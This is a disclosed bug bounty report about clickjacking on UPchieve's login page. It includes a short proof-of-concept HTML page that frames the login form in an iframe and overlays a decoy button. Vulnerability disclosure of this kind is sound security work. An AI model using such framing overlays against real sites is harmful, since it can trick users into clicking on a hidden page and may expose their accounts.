# Clickjacking ar https://hackers.upchieve.org/login

## Report Details
- **Report ID**: 1400405
- **URL**: https://hackerone.com/reports/1400405
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-11-15T12:01:30.445Z
- **Disclosed**: 2021-11-19T16:06:50.565Z

## Reporter
- **Username**: maisanisnotyours
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: upchieve

## Vulnerability Information
I found clickjacking at login page on https://hackers.upchieve.org that can be exploited if the UI overlay can be performed correctly by the attacker.

```<html>
<head>
<title>Clickjack test page</title>
</head>
<body>
<p>Website is vulnerable to clickjacking!</p>
<iframe src="https://hackers.upchieve.org/login" width="1000" height="550"></iframe>
<div style="height: 30px;width: 130px;left: 53%;bottom: 39%;background: #789;" class="xss"><button>Click me when you finish :)</button></div>
</body>
</body>
</html>```

## Impact

Its login page so if the UI overlay can be performed correctly by the attacker, this can lead to account takeover.

## Attachments
- Clickjacking.html
